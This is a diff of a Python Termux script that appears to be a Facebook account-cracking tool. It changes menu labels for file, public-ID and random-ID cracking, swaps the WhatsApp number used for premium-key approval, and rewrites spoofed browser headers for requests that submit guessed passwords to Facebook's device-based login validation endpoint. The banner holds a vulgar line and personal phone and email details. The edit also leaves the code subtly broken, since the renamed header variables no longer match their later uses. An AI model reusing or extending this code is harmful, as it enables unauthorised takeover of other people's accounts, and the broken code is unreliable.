@@ -162,7 +162,7 @@ def main_apv():
         time.sleep(3.5)
         tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
 
-        os.system('am start https://wa.me/+01883303197?text=' + tks)
+        os.system('am start https://wa.me/+92188049915?text=' + tks)
 
         
 
@@ -205,13 +205,13 @@ logo ="""
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴀᴜᴛʜᴏʀ]\033[1;31m  ➟  \033[1;32mARSHAD ARSHAD TOPU       \033[1;31m       │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ꜰᴀᴄᴇʙᴏᴏᴋ]\033[1;31m➟  \033[1;32mARSHAD AHMED TOPU          \033[1;31m      │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ɢɪᴛʜᴜʙ]\033[1;31m  ➟ \033[1;32m ARSHAD-404-CYBER                \033[1;31m        │
-\033[1;31m│\033[1;37m [+]  \033[1;32m[ʏᴏᴜᴛᴜʙᴇ]\033[1;31m ➟  \033[1;32mARSHAD VAU                  \033[1;31m        │
+\033[1;31m│\033[1;37m [+]  \033[1;32m[ʏᴏᴜᴛᴜʙᴇ]\033[1;31m ➟  \033[1;32mARSHAD AHMED TOPU                  \033[1;31m        │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴠᴇʀꜱᴏɴ]\033[1;31m  ➟  \033[1;32m1.2                          \033[1;31m      │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ɢʀᴏᴜᴘ]\033[1;31m   ➟  \033[1;32mARSHAD TERMUX COMMAND \033[1;37m {\033[1;36mARSHAD\033[1;37m} \033[1;31m     │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴡʜᴀᴛꜱᴀᴘᴘ]\033[1;31m➟  \033[1;32m01883303197\033[1;37m \033[1;36m \033[1;37m \033[1;31m                     │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ɴᴇᴛᴡᴏʀᴋ]\033[1;31m ➟  \033[1;32m3G,4G,5G \033[1;37m {\033[1;36mON Mobile Data\033[1;37m} \033[1;31m        │
 \033[1;31m│\033[1;37m [+]  \033[1;32m[ᴄᴏɴᴛᴀᴄᴛ]\033[1;31m ➟  \033[1;32mtopumd763@gmail.com\033[1;37m \033[1;36m\033[1;37m \033[1;31m │
-\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴛᴏᴏʟꜱ]\033[1;31m   ➟  \033[1;32mPAID \033[1;37m  \033[1;31m              │
+\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴛᴏᴏʟꜱ]\033[1;31m   ➟  \033[1;32mPAK RANDOM CLONING \033[1;37m  \033[1;31m              │
 \033[1;37m╚\033[1;36m════\033[1;37m═════\033[41m\033[1;37m[ 𝙉𝙖 𝙭𝙪𝙙𝙞 𝙁𝙢𝙯 𝙉𝙖 𝙭𝙪𝙙𝙞 𝘾𝙚𝙡𝙚𝙗𝙧𝙞𝙩𝙮🖕 ]\x1b[0m═════\033[1;36m═════\033[1;37m╝
 
 \033[1;31m========================================================"""
@@ -222,10 +222,10 @@ def R():
 			os.system("clear")
 			print(logo)
 			print ('༄•───────────────────────────────────────•༄')
-			print("\033[1;93m{1}\033[1;92m ➟ \033[1;95mSTART FILE CRACKING  : BST METHOD")
-			print("\033[1;93m{2}\033[1;94m ➟ \033[1;94mPUBLICK ID CRACKING  : 100%% LOGIN")
-			print("\033[1;93m{3}\033[1;95m ➟ \033[1;93mUNLIMITED FILEMAKING : 100% LOGIN")
-			print("\033[1;93m{4}\033[1;96m ➟ \033[1;92mRANDOM ID CRACKING   : 100% LOGIN")
+			print("\033[1;93m{1}\033[1;92m ➟ \033[1;95mSTART FILE CRACKING  : BEST METHOD")
+			print("\033[1;93m{2}\033[1;94m ➟ \033[1;94mPUBLICK ID CRACKING  : WORKING")
+			print("\033[1;93m{3}\033[1;95m ➟ \033[1;93mUNLIMITED FILEMAKING : BEST METHOD")
+			print("\033[1;93m{4}\033[1;96m ➟ \033[1;92mRANDOM ID CRACKING   : SUPER WORKING")
 			print("\033[1;93m{5}\033[1;97m ➟ \033[1;91mFOLLEW MY FACEBOOK  PAG : 😽")
 			print ('\033[1;92m༄•───────────────────────────────────────•༄')
 			key = input(" [*] Choose : ")
@@ -323,35 +323,24 @@ class __xxx__:
 
                 session=requests.Session()
 
-                header = {
-
-                    "Host":cebok,
-
-                    "upgrade-insecure-requests":"1",
-
-                    "user-agent":"NokiaC5-05/22.5.007 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba+",
-
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-
-                    "dnt":"1",
-
-                    "x-requested-with":"mark.via.gp",
-
-                    "sec-fetch-site":"same-origin",
-
-                    "sec-fetch-mode":"cors",
-
-                    "sec-fetch-user":"empty",
-
-                    "sec-fetch-dest":"document",
-
-                    "referer":"https://m.facebook.com/",
-
-                    "accept-encoding":"gzip, deflate br",
-
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-
-                }
+                headers = {
+                   'authority': 'p.facebook.com',
+                   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                   'accept-language': 'en-US,en;q=0.9',
+                   'cache-control': 'max-age=0',
+                   'sec-ch-prefers-color-scheme': 'light',
+                   'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+                   'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+                   'sec-ch-ua-mobile': '?1',
+                   'sec-ch-ua-platform': '"Android"',
+                   'sec-ch-ua-platform-version': '"11.0.0"',
+                   'sec-fetch-dest': 'document',
+                   'sec-fetch-mode': 'navigate',
+                   'sec-fetch-site': 'none',
+                   'sec-fetch-user': '?1',
+                   'upgrade-insecure-requests': '1',
+                   'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+         }
 
                 r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
 
@@ -371,39 +360,22 @@ class __xxx__:
 
                 }
 
-                header1 = {
-
-                    "Host":cebok,
-
-                    "cache-control":"max-age=0",
-
-                    "upgrade-insecure-requests":"1",
-
-                    "origin":"https://"+cebok,
-
-                    "content-type":"application/x-www-form-urlencoded",
-
-                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",
-
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-
-                    "x-requested-with":"XMLHttpRequest",
-
-                    "sec-fetch-site":"same-origin",
-
-                    "sec-fetch-mode":"cors",
-
-                    "sec-fetch-user":"empty",
-
-                    "sec-fetch-dest":"document",
-
-                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
-
-                    "accept-encoding":"gzip, deflate br",
-
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-
-                }
+              headers = {
+                  'authority': 'www.facebook.com',
+                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                  'accept-language': 'en-US,en;q=0.9',
+                  'cache-control': 'max-age=0',  
+                  'referer': 'https://www.google.com/',
+                  'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+                  'sec-ch-ua-mobile': '?0',
+                  'sec-ch-ua-platform': '"Linux"',
+                  'sec-fetch-dest': 'document',
+                  'sec-fetch-mode': 'navigate',
+                  'sec-fetch-site': 'cross-site',
+                  'sec-fetch-user': '?1',
+                  'upgrade-insecure-requests': '1',
+                  'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+        }
 
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
 
